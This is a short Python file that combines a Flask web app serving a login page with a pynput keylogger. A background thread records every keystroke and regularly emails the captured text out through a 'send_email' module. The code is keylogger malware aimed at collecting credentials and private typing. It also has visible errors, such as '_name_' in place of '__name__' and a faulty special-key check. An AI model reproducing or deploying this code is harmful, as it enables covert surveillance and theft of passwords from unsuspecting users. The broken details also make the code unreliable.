from flask import Flask, render_template
import threading
import pynput
from pynput.keyboard import Key, Listener
import send_email

app = Flask(_name_)


def on_press(key):
    print(key, end=" ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)


def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key.find("Key") > 0:
            k = ""
        message += k
    print(message)
    send_email.sendEmail(message)


def on_release(key):
    if key == Key.esc:
        return False


@app.route('/')
def hello():
    return render_template('login.html')


if _name_ == "_main_":
    keys = []
    count = 0

    listener_thread = threading.Thread(target=Listener(on_press=on_press, on_release=on_release).start)
    listener_thread.daemon = True
    listener_thread.start()

    app.run(debug=True)